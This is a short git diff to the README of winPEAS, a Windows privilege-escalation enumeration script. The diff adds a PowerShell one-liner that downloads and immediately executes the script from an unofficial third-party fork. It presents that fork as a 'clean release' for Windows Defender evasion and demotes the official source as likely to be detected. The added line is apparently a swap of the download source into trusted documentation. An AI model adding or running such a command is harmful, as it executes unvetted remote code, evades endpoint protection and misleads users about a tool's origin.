@@ -14,8 +14,11 @@ The official **maintainer of this script is [RandolphConley](https://github.com/
 
 Download the **[latest releas from here](https://github.com/peass-ng/PEASS-ng/releases/latest)**.
 
-
 ```bash
+# Get latest clean release (Windows Defender evasion)
+powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/moscowchill/PEASS-ng/main/winPEAS/winPEASps1/winPEAS.ps1')"
+
+# Original version (may be detected)
 powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
 ```
 
